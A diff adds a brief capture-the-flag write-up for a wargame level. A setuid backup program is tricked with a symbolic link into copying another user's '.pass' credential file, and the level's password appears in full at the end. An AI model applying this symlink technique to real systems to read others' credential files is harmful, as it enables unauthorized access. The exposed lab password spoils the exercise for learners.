@@ -1,0 +1,11 @@
+In this level the program wait for a filename to open and writes its content to a backup directory
+located in the home directory (which is also owned by level09)
+the program takes the filename and concatenated it to "./backups" and try to open
+both  "./backups/filename" and "filename"
+we can't give a relative path to level09's .pass file because the program can't write into level08 home directory
+so the solution is to create a symbolic link and use it
+
+~$ ln -s ../level09/.pass link
+~$ ./level08
+~$ cat backups/link
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
